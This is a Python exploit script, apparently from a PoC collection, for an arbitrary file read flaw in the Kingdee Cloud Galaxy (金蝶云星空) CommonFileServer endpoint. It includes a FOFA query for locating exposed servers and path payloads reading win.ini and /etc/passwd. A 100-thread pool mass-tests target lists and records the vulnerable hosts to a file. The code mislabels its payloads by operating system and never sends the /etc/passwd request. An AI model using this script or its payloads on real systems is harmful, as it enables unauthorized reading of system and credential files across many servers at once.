# 金蝶云星空 CommonFileServer 任意文件读取

#fofa语法：title="金蝶云星空 管理中心"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 

   _____                                      ______ _ _       _____                          
  / ____|                                    |  ____(_) |     / ____|                         
 | |     ___  _ __ ___  _ __ ___   ___  _ __ | |__   _| | ___| (___   ___ _ ____   _____ _ __ 
 | |    / _ \| '_ ` _ \| '_ ` _ \ / _ \| '_ \|  __| | | |/ _ \\___ \ / _ \ '__\ \ / / _ \ '__|
 | |___| (_) | | | | | | | | | | | (_) | | | | |    | | |  __/____) |  __/ |   \ V /  __/ |   
  \_____\___/|_| |_| |_|_| |_| |_|\___/|_| |_|_|    |_|_|\___|_____/ \___|_|    \_/ \___|_|   
                                                                                              
                                                                                                                                                                                       
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="金蝶云星空 CommonFileServer")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/CommonFileServer/c:/windows/win.ini'  #liunx
    url_payload1 = '/CommonFileServer/etc/passwd'          #Windows
    url = target + url_payload
    url1 = target + url_payload1
    header = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cookie': 'ASP.NET_SessionId=keao5s0h4wecm4uhfi4l4h4j; Theme=standard; kdservice-sessionid=6331742c-c9cd-4990-8387-efd2b27fcd08',
        'Connection': 'keep-alive',
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.get(url=url,headers=header,verify=False)
        if res.status_code == 200:
            print(f"f[+]该url存在任意文件读取漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在任意文件读取漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()